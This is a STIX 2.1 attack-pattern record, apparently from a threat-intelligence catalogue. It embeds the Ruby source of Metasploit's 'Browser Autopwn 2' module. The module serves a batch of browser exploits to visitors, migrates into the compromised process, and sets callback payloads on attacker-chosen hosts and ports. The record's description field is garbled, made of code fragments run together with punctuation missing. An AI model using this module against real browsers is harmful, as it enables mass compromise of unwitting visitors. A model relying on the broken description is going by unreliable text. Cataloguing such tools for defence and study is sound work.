{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--11b861f8-b2fe-4cf6-aaac-2bcf97e335b5",
    "created": "2024-08-14T16:21:55.035414Z",
    "modified": "2024-08-14T16:21:55.035418Z",
    "name": "\"HTTP Client Automatic Exploiter 2 (Browser Autopwn)\"",
    "description": "Start a bunch of modules and direct clients to appropriate exploits } ] ] 'PassiveActions' => [ 'WebServer' ] 'DefaultOptions' => { # We know that most of these exploits will crash the browser, so # set the default to run migrate right away if possible. \"InitialAutoRunScript\" => \"migrate -f\"  'DefaultAction'  => 'WebServer'))   register_advanced_options(get_advanced_options, self.class)  register_options( [ OptRegexp.new('INCLUDE_PATTERN', [false, 'Pattern search to include specific modules']) OptRegexp.new('EXCLUDE_PATTERN', [false, 'Pattern search to exclude specific modules'])  ])  register_advanced_options([ OptInt.new('ExploitReloadTimeout', [false, 'Number of milliseconds before trying the next exploit', 3000]) OptInt.new('MaxExploitCount', [false, 'Number of browser exploits to load', 21]) OptString.new('HTMLContent', [false, 'HTML Content', '']) OptAddressRange.new('AllowedAddresses', [false, \"A range of IPs you're interested in attacking\"]) OptInt.new('MaxSessionCount', [false, 'Number of sessions to get', -1]) OptBool.new('ShowExploitList', [true, \"Show which exploits will actually be served to each client\", false]) ]) end  def get_advanced_options opts = [] DEFAULT_PAYLOADS.each_pair do |platform, payload_info| opts << OptString.new(\"PAYLOAD_#{platform.to_s.upcase}\", [true, \"Payload for #{platform} browser exploits\", payload_info[:payload] ]) opts << OptInt.new(\"PAYLOAD_#{platform.to_s.upcase}_LPORT\", [true, \"Payload LPORT for #{platform} browser exploits\", payload_info[:lport]]) opts << OptAddress.new(\"LHOST\", [true, \"The local host for the exploits and handlers\", Rex::Socket.source_address]) end  opts end  def on_request_exploit(cli, request, target_info) serve = build_html(cli, request) send_exploit_html(cli, serve) end  def run exploit end end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/browser_autopwn2.rb",
            "external_id": "browser_autopwn2.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2015/07/16/the-new-metasploit-browser-autopwn-strikes-faster-and-smarter--part-2"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::BrowserAutopwn2\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"HTTP Client Automatic Exploiter 2 (Browser Autopwn)\",\n      'Description'    => %q{\n        This module will automatically serve browser exploits. Here are the options you can\n        configure:\n\n        The INCLUDE_PATTERN option allows you to specify the kind of exploits to be loaded. For example,\n        if you wish to load just Adobe Flash exploits, then you can set Include to 'adobe_flash'.\n\n        The EXCLUDE_PATTERN option will ignore exploits. For example, if you don't want any Adobe Flash\n        exploits, you can set this. Also note that the Exclude option will always be evaluated\n        after the Include option.\n\n        The MaxExploitCount option specifies the max number of exploits to load by Browser Autopwn.\n        By default, 20 will be loaded. But note that the client will probably not be vulnerable\n        to all 20 of them, so only some will actually be served to the client.\n\n        The HTMLContent option allows you to provide a basic webpage. This is what the user behind\n        the vulnerable browser will see. You can simply set a string, or you can do the file://\n        syntax to load an HTML file. Note this option might break exploits so try to keep it\n        as simple as possible.\n\n        The MaxSessionCount option is used to limit how many sessions Browser Autopwn is allowed to\n        get. The default -1 means unlimited. Combining this with other options such as RealList\n        and Custom404, you can get information about which visitors (IPs) clicked on your malicious\n        link, what exploits they might be vulnerable to, redirect them to your own internal\n        training website without actually attacking them.\n\n        For more information about Browser Autopwn, please see the referenced blog post.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'sinn3r' ],\n      'DisclosureDate' => '2015-07-05',\n      'References'     =>\n        [\n          [ 'URL', 'https://www.rapid7.com/blog/post/2015/07/16/the-new-metasploit-browser-autopwn-strikes-faster-and-smarter--part-2' ]\n        ],\n      'Actions'     =>\n        [\n          [ 'WebServer', {\n            'Description' => 'Start a bunch of modules and direct clients to appropriate exploits'\n          } ],\n        ],\n      'PassiveActions' =>\n        [ 'WebServer' ],\n      'DefaultOptions' => {\n          # We know that most of these exploits will crash the browser, so\n          # set the default to run migrate right away if possible.\n          \"InitialAutoRunScript\" => \"migrate -f\",\n        },\n      'DefaultAction'  => 'WebServer'))\n\n\n    register_advanced_options(get_advanced_options, self.class)\n\n    register_options(\n      [\n        OptRegexp.new('INCLUDE_PATTERN', [false, 'Pattern search to include specific modules']),\n        OptRegexp.new('EXCLUDE_PATTERN', [false, 'Pattern search to exclude specific modules']),\n\n      ])\n\n    register_advanced_options([\n        OptInt.new('ExploitReloadTimeout', [false, 'Number of milliseconds before trying the next exploit', 3000]),\n        OptInt.new('MaxExploitCount', [false, 'Number of browser exploits to load', 21]),\n        OptString.new('HTMLContent', [false, 'HTML Content', '']),\n        OptAddressRange.new('AllowedAddresses', [false, \"A range of IPs you're interested in attacking\"]),\n        OptInt.new('MaxSessionCount', [false, 'Number of sessions to get', -1]),\n        OptBool.new('ShowExploitList', [true, \"Show which exploits will actually be served to each client\", false])\n      ])\n  end\n\n  def get_advanced_options\n    opts = []\n    DEFAULT_PAYLOADS.each_pair do |platform, payload_info|\n      opts << OptString.new(\"PAYLOAD_#{platform.to_s.upcase}\", [true, \"Payload for #{platform} browser exploits\", payload_info[:payload] ])\n      opts << OptInt.new(\"PAYLOAD_#{platform.to_s.upcase}_LPORT\", [true, \"Payload LPORT for #{platform} browser exploits\", payload_info[:lport]])\n      opts << OptAddress.new(\"LHOST\", [true, \"The local host for the exploits and handlers\", Rex::Socket.source_address])\n    end\n\n    opts\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    serve = build_html(cli, request)\n    send_exploit_html(cli, serve)\n  end\n\n  def run\n    exploit\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-07-05"
}